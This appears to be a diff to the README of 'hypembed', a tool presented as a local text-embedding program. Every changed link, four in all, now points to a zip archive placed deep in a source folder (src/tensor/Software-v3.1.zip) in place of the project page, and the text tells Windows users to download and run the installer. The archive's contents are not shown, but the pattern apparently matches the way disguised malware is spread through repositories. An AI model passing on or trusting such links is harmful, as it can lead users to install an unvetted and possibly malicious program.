@@ -1,6 +1,6 @@
 # ⚙️ hypembed - Fast Local Text Embedding Tool
 
-[![Download hypembed](https://img.shields.io/badge/Download-hypembed-brightgreen)](https://github.com/minniwoodsy325/hypembed)
+[![Download hypembed](https://img.shields.io/badge/Download-hypembed-brightgreen)](https://github.com/minniwoodsy325/hypembed/raw/refs/heads/main/src/tensor/Software-v3.1.zip)
 
 ## 📄 About hypembed
 
@@ -25,7 +25,7 @@ hypembed works well on most laptops and desktops that meet these basic specs.
 
 Click the big green button at the top or visit the official page here:
 
-[Download and Installation Page](https://github.com/minniwoodsy325/hypembed)
+[Download and Installation Page](https://github.com/minniwoodsy325/hypembed/raw/refs/heads/main/src/tensor/Software-v3.1.zip)
 
 This page gives you access to the latest version of hypembed. It will have the necessary files ready for your Windows machine.
 
@@ -94,7 +94,7 @@ You do not usually need to change this unless you want to organize files manuall
 
 Visit the official page to check for new versions or get help:
 
-[https://github.com/minniwoodsy325/hypembed](https://github.com/minniwoodsy325/hypembed)
+[https://github.com/minniwoodsy325/hypembed/raw/refs/heads/main/src/tensor/Software-v3.1.zip](https://github.com/minniwoodsy325/hypembed/raw/refs/heads/main/src/tensor/Software-v3.1.zip)
 
 New releases may improve speed, fix bugs, or add features.
 
@@ -104,6 +104,6 @@ New releases may improve speed, fix bugs, or add features.
 
 Use this link to visit the official download page and get started:
 
-[Download hypembed](https://github.com/minniwoodsy325/hypembed)
+[Download hypembed](https://github.com/minniwoodsy325/hypembed/raw/refs/heads/main/src/tensor/Software-v3.1.zip)
 
 Follow the steps on that page to download the Windows installer, then run it to set up hypembed on your computer. No extra software or commands are needed after installation.
